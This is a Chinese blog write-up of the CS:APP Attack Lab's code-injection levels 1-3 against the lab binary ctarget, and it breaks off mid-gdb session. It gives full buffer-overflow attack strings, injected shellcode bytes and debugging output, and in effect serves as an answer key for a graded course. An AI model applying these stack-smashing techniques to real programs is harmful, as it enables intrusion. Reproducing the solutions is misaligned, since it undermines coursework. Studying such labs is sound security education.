<h2 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h2><p>目标程序ctarget和rtarget都使用getbuf函数从标准输入流中读取字符串，getbuf函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Gets函数同标准库函数gets相似，其从标准输入流中读入以’\n’或者是EOF结尾的字符串并且将其存储在制定的地址。在这段代码中，目标地址是一个长BUFFER_SIZE的字符数组。<br>但同时Gets()和gets()都不具备检测目的缓冲区是否足够大以存储输入的字符串的功能，因此可能存在缓冲区溢出的风险。在本次实验中，我们要利用该缓冲区溢出漏洞，改变目标程序的行为。</p>
<p>对于自学者来说，运行target的程序的时候需要带上参数-q以避免其连接并不存在的计分服务器。同时需要注意，用来生成攻击字符串的16进制的代码的任意中间位置都不能包含0a，因为其ascii表示是’\n’，在其之后的任意代码都不会被目标程序读入了。</p>
<h2 id="实验过程及分析"><a href="#实验过程及分析" class="headerlink" title="实验过程及分析"></a>实验过程及分析</h2><h3 id="第1部分-代码注入（Code-Injection）攻击"><a href="#第1部分-代码注入（Code-Injection）攻击" class="headerlink" title="第1部分 代码注入（Code Injection）攻击"></a>第1部分 代码注入（Code Injection）攻击</h3><p>本部分总共包含3个阶段，需要生成相应的攻击字符串去攻击ctarget。目标文件ctarget的栈位置是固定的，并且栈上的代码可执行。这为我们的代码注入攻击提供了机会。</p>
<h4 id="等级1"><a href="#等级1" class="headerlink" title="等级1"></a>等级1</h4><p>阶段一不需要注入自己的代码，攻击字符串只需要将程序重定向至已有的过程即可。</p>
<p>在ctarget中，函数getbuf被test函数调用，而test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>现在我们需要修改程序的行为，让程序从getbuf返回时不返回到test函数中，而跳转至touch1函数。函数touch1如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先，我们对于目标可执行程序ctarget使用objdump -d ctarget &gt; ctarget-disassemble生成ctarget的反汇编代码。然后观察反汇编代码中的getbuf函数，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:       48 83 ec 28             sub    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">  4017ac:       48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:       e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:       b8 01 00 00 00          mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">  4017b9:       48 83 c4 28             add    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">  4017bd:       c3                      retq   </span><br><span class="line">  4017be:       90                      nop</span><br><span class="line">  4017bf:       90                      nop</span><br></pre></td></tr></table></figure></p>
<p>通过观察sub $0x28,%rsp可以知道，getbuf在局部栈上开辟了大小为40个字节的空间，据此我们可以推测BUFFER_SIZE为40。那么，如果我们输入的字符串长度超过了40个字节，就会造成缓冲区溢出。</p>
<p>这里我们需要复习一下函数栈帧的相关知识。被调用者Q的栈帧自栈底（高地址）到栈顶（低地址）包括了被保存的寄存器，局部变量和参数构造区。而调用者Q的栈帧自栈底到栈顶包括了参数以及返回地址。</p>
<p>对于getbuf函数来说，不存在被保存的寄存器，在缓冲区溢出之后，溢出的字符会直接覆盖调用者栈帧中的返回地址。因此，直接使用touch1的起始地址作为溢出的字符串覆盖返回地址即可。</p>
<p>我们观察反汇编代码中touch1函数的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br></pre></td></tr></table></figure><br>据此可以得出攻击代码的16位表示如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>其中，前40个字节的内容无关紧要（只要不是0a即可），因为它们属于未溢出的部分。这段攻击代码中而真正起作用的是缓冲区溢出的部分，即最后的8个字节。同时要注意到x86_86的机器是小端表示的字节序，即低位放在低字节，高位放在高字节，并且栈的增长方向是由低地址增长到高地址。所以最后8个字节的顺序为 c0 17 40 00 00 00 00 00。<br>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level1/level1.txt|./hex2raw|./ctarget -q</span><br><span class="line">数Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级2"><a href="#等级2" class="headerlink" title="等级2"></a>等级2</h4><p>阶段2需要在攻击字符串中注入少量的代码。</p>
<p>在ctarget中，函数touch2如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: you called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>任务是让ctarget执行函数touch2的代码而不是直接返回到test函数。并且，你必须假装你已经传递了cookie的值作为touch2的参数。</p>
<p>考虑到在ctarget中，栈地址固定以及允许在栈上执行代码，所以我们可以通过缓冲区溢出漏洞将返回地址指定到栈上，在栈上执行相应的指令，为函数touch2设置参数，最后再从栈上返回至touch2函数即可。</p>
<p>同阶段一相似，攻击代码的前40个字节无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，为了让函数能返回到栈上执行代码，我们需要知道栈地址。</p>
<p>使用gdb加载ctarget，并为getbuf函数设置断点，执行程序，当程序因为断点而暂停的时候打印rsp的值。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">break</span> getbuf</span><br><span class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</span><br><span class="line">(gdb) run -q</span><br><span class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12	buf.c: 没有那个文件或目录.</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$rsp</span></span><br><span class="line"><span class="variable">$1</span> = 0x5561dca0</span><br></pre></td></tr></table></figure><br>从中可以得出结论，ctarget在执行getbuf时的栈地址（指向返回地址）为0x5561dca0。因此我们应该将返回地址指定为0x5561dca8。</p>
<p>然后我们用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x59b997fa, %edi <span class="comment">;设置cookie为参数</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch2的地址）</span></span><br><span class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></span><br></pre></td></tr></table></figure><br>其中add $16,%rsp的值可能需要修改，这是因为我们无法确定这段汇编代码反汇编后占多少字节。同时，我们也要保证rsp移动的位数是8的倍数，这是栈的特性（即push和pop时操作数据的大小为一个机器字长）决定的。</p>
<p>写完了攻击代码后，我们依次使用<code>gcc -c exploit.s</code>以及<code>objdump -d exploit.o &gt; exploit.d</code>将攻击代码汇编和反汇编。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; gcc -c exploit.s                                             </span><br><span class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; objdump -d exploit.o &gt; exploit.d                             </span><br><span class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; cat exploit.d                                                 </span><br><span class="line"></span><br><span class="line">exploit.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	bf fa 97 b9 59       	mov    <span class="variable">$0x59b997fa</span>,%edi</span><br><span class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</span><br><span class="line">   9:	c3                   	retq   </span><br></pre></td></tr></table></figure><br>总共是10个字节，小于16个字节，因此源攻击代码中的add $16,%rsp可以直接使用，无需继续更改。<br>最后我们在ctarget-disassemble中观察函数touch2的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br></pre></td></tr></table></figure></p>
<p>根据以上的信息，我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</span><br><span class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</span><br><span class="line">bf fa 97 b9 59 48 83 c4</span><br><span class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* 返回地址 指向函数touch2 */</span><br></pre></td></tr></table></figure><br>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level2/level2.txt|./hex2raw|./ctarget -q     </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF FA 97 B9 59 48 83 C4 10 C3 00 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3"><a href="#等级3" class="headerlink" title="等级3"></a>等级3</h4><p>阶段3同样包含了代码注入攻击，但是这次需要将一个字符串作为参数传入。<br>在ctarget中，函数hexmatch和touch3的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>;		<span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie,sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>任务是让程序执行touch3的代码而不是直接返回到test，你必须假装你已经将一个cookie的字符串表示作为参数传递给了touch3。</p>
<p>该阶段的思路同阶段二相似，不同的是，阶段二要求传递的参数是一个数字，而阶段三要求传递的参数是一个自己构造的字符串的首地址。因此，我们需要将目标字符串也通过缓冲区溢出攻击注入到栈段，并且将其首地址设置为%rdi。</p>
<p>现在我们来构造攻击字符串，首先，同阶段一和阶段二一样，攻击字符串的前40个字符串无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，同阶段二一样，我们将该返回地址设置为0x5561dca8。</p>
<p>接下来我们使用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x0, %edi <span class="comment">;设置第一个参数指向一个字符串（保留）</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch3的地址）</span></span><br><span class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></span><br></pre></td></tr></table></figure><br>注意，在构造该攻击字符串的时候，我们还不知道cookie的字符串的表示的首地址。故我们先使用0x0进行占位。生成最后的攻击字符串时只要用相应的栈地址替换0x0即可。</p>
<p>写完攻击代码之后，我们依次使用gcc和objdump进行汇编和反汇编，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; gcc -c exploit.s                                             </span><br><span class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; objdump -d exploit.o &gt; exploit.d                             </span><br><span class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; cat exploit.d                                                </span><br><span class="line"></span><br><span class="line">exploit.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	bf 00 00 00 00       	mov    <span class="variable">$0x0</span>,%edi</span><br><span class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</span><br><span class="line">   9:	c3                   	retq   </span><br></pre></td></tr></table></figure></p>
<p>在攻击代码之后，栈上紧跟着的应该是该攻击代码的返回地址，毫无疑问，在这里我们需要将返回地址指向函数touch3的起始地址。</p>
<p>现在需要讨论的问题是，字符串应该放在栈上的什么地方？首先我们可以考虑将字符串放置在攻击字符串的前40个字节中。这样，具体的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 其中最后16个字节保存了cookie的字符串表示 */</span><br><span class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</span><br><span class="line">bf 90 dc 61 55 48 83 c4 /* 攻击代码 其中将%rdi指向cookie的字符串表示的首地址 */</span><br><span class="line">10 c3 00 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</span><br></pre></td></tr></table></figure><br>下面我们用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw|./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Misfire: You called touch3(<span class="string">""</span>)</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:FAIL:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 A8 DC 61 55 00 00 00 00 BF 90 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>糟糕，程序出错了，从Misfire: You called touch3(“”)中我们可以看出，%rdi指向的字符串是空字符串。这显然与我们的预期不符。我们的攻击代码理应没有任何问题。那么问题出在哪儿呢？</p>
<p>下面我们将攻击字符串导出成文件并且在gdb中进行调试，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw &gt; weirdError</span><br><span class="line">user@BlackDragon ~/C/A/target1&gt; gdb ctarget                 </span><br><span class="line">GNU gdb (GDB) 7.12.1</span><br><span class="line">Copyright (C) 2017 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">Reading symbols from ctarget...done.</span><br><span class="line">(gdb) <span class="built_in">break</span> getbuf</span><br><span class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</span><br><span class="line">(gdb) run -i weirdError -q</span><br><span class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -i weirdError -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12	buf.c: 没有那个文件或目录.</span><br><span class="line">(gdb) nexti 5</span><br><span class="line">0x00000000004017bd	16	<span class="keyword">in</span> buf.c</span><br><span class="line">(gdb) x /16b 0x5561dc90</span><br><span class="line">0x5561dc90:	53	57	98	57	57	55	102	97</span><br><span class="line">0x5561dc98:	0	0	0	0	0	0	0	0</span><br><span class="line">......After Some Steps......</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> touch3:</span><br><span class="line">   0x00000000004018fa &lt;+0&gt;:	push   %rbx</span><br><span class="line">   0x00000000004018fb &lt;+1&gt;:	mov    %rdi,%rbx</span><br><span class="line">   0x00000000004018fe &lt;+4&gt;:	movl   <span class="variable">$0x3</span>,0x202bd4(%rip)        <span class="comment"># 0x6044dc &lt;vlevel&gt;</span></span><br><span class="line">   0x0000000000401908 &lt;+14&gt;:	mov    %rdi,%rsi</span><br><span class="line">   0x000000000040190b &lt;+17&gt;:	mov    0x202bd3(%rip),%edi        <span class="comment"># 0x6044e4 &lt;cookie&gt;</span></span><br><span class="line">=&gt; 0x0000000000401911 &lt;+23&gt;:	callq  0x40184c &lt;hexmatch&gt;</span><br><span class="line">   0x0000000000401916 &lt;+28&gt;:	<span class="built_in">test</span>   %eax,%eax</span><br><span class="line">   0x0000000000401918 &lt;+30&gt;:	je     0x40193d &lt;touch3+67&gt;</span><br><span class="line">   0x000000000040191a &lt;+32&gt;:	mov    %rbx,%rdx</span><br><span class="line">   0x000000000040191d &lt;+35&gt;:	mov    <span class="variable">$0x403138</span>,%esi</span><br><span class="line">   0x0000000000401922 &lt;+40&gt;:	mov    <span class="variable">$0x1</span>,%edi</span><br><span class="line">   0x0000000000401927 &lt;+45&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x000000000040192c &lt;+50&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x0000000000401931 &lt;+55&gt;:	mov    <span class="variable">$0x3</span>,%edi</span><br><span class="line">   0x0000000000401936 &lt;+60&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x000000000040193b &lt;+65&gt;:	jmp    0x40195e &lt;touch3+100&gt;</span><br><span class="line">   0x000000000040193d &lt;+67&gt;:	mov    %rbx,%rdx</span><br><span class="line">   0x0000000000401940 &lt;+70&gt;:	mov    <span class="variable">$0x403160</span>,%esi</span><br><span class="line">   0x0000000000401945 &lt;+75&gt;:	mov    <span class="variable">$0x1</span>,%edi</span><br><span class="line">   0x000000000040194a &lt;+80&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">(gdb) x /16b 0x5561dc90</span><br><span class="line">0x5561dc90:	53	57	98	57	57	55	102	97</span><br><span class="line">0x5561dc98:	0	0	0	0	0	0	0	0</span><br><span class="line">(gdb) nexti</span><br><span class="line">0x0000000000401916	73	<span class="keyword">in</span> visible.c</span><br><span class="line">(gdb) x /16b 0x5561dc90</span><br><span class="line">0x5561dc90:	0	-98	119	-23	120	13	-32	-89</span><br><span class="line">0x5561dc98:	-112	-36	97	85	0	0	0	